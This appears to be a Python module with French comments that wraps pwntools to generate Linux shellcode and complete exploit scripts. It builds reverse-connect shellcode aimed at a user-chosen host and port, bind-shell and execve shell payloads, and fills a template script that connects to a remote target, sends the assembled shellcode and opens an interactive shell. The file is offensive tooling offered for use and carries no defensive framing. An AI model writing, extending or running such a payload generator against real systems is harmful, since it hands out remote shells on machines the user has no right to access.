# Configuration pour éviter des problèmes d'environnement avec pwntools
import os
import sys
import logging

# Configuration d'environnement sans aucune importation liée à Streamlit
os.environ['PWNLIB_NOTERM'] = '1'
os.environ['PYTHONIOENCODING'] = 'utf-8'

# Configuration du logging - éviter d'utiliser la console
logging.basicConfig(
    level=logging.INFO,
    format='%(levelname)s:%(name)s: %(message)s',
    handlers=[logging.FileHandler("exploit_generator.log"), logging.NullHandler()]
)
logger = logging.getLogger("exploit_generator")

# Module d'exploitation complètement indépendant
class ExploitGenerator:
    def __init__(self):
        self.pwntools_available = False
        self.context = None
        self.error = None
        
        # Tenter d'importer pwntools de manière isolée
        try:
            logger.info("Tentative d'importation de pwntools...")
            # Importer uniquement les composants nécessaires
            self._import_pwntools()
            logger.info("pwntools importé avec succès")
        except Exception as e:
            self.error = f"Erreur d'importation: {str(e)}"
            logger.error(self.error)
    
    def _import_pwntools(self):
        """Méthode isolée pour importer pwntools"""
        try:
            # Utiliser __import__ pour éviter les importations au niveau du module
            pwn = __import__('pwn')
            
            # Extraire seulement les composants nécessaires
            self.context = pwn.context
            self.asm = pwn.asm
            self.shellcraft = pwn.shellcraft
            
            # Configurer le contexte
            self.context.update(arch='amd64', os='linux', bits=64, endian='little')
            self.pwntools_available = True
        except Exception as e:
            raise ImportError(f"Échec de l'importation pwntools: {e}")
    
    def is_available(self):
        return self.pwntools_available
    
    def get_error(self):
        return self.error
    
    def create_shellcode(self, shellcode_type, target, custom_port, arch='amd64'):
        """Génère le shellcode approprié"""
        if not self.pwntools_available:
            return None, "pwntools n'est pas disponible"
        
        try:
            # Mettre à jour l'architecture
            self.context.arch = arch
            
            # Générer le shellcode
            if shellcode_type == 'shell_reverse_tcp':
                shellcode = self.shellcraft.linux.connectback(target, custom_port)
            elif shellcode_type == 'shell_bind_tcp':
                shellcode = self.shellcraft.linux.bindsh(custom_port)
            elif shellcode_type == 'execve':
                shellcode = self.shellcraft.linux.sh()
            else:
                return None, "Type de shellcode non supporté"
                
            # Assembler le shellcode
            assembled_shellcode = self.asm(shellcode)
            return assembled_shellcode, None
        except Exception as e:
            return None, f"Erreur de création du shellcode: {str(e)}"

    def generate_exploit_code(self, shellcode_type, target, custom_port, selected_arch='amd64'):
        """Génère le code d'exploit complet"""
        if not self.pwntools_available:
            return f"""#!/usr/bin/python3
# Erreur: pwntools n'est pas disponible
# {self.error}
# Pour installer pwntools:
# python3 -m pip install pwntools
"""
        
        assembled_shellcode, error = self.create_shellcode(shellcode_type, target, custom_port, selected_arch)
        
        if error:
            return f"""#!/usr/bin/python3
# {error}
# Pour installer pwntools:
# python3 -m pip install pwntools
"""
        
        # Template de l'exploit
        return f"""#!/usr/bin/python3
from pwn import *

# Configuration
context.arch = '{selected_arch}'
context.os = 'linux'
context.log_level = 'info'

def exploit():
    try:
        print("[+] Démarrage de l'exploit...")
        target = '{target}'
        port = {custom_port}
        
        print(f"[*] Connexion à {{target}}:{{port}}")
        r = remote(target, port)
        
        print("[*] Envoi du shellcode...")
        shellcode = {repr(assembled_shellcode)}
        r.sendline(shellcode)
        print("[+] Shellcode envoyé avec succès")
        
        r.interactive()
        
    except Exception as e:
        print(f"[-] Erreur: {{str(e)}}")
        return False
    return True

if __name__ == '__main__':
    exploit()
"""

# Instanciation globale pour usage direct - mais créée uniquement à la demande
generator = None

def get_generator():
    """Fonction d'accès au générateur - création lazy pour éviter les conflits"""
    global generator
    if generator is None:
        logger.info("Création du générateur d'exploits à la demande...")
        generator = ExploitGenerator()
    return generator
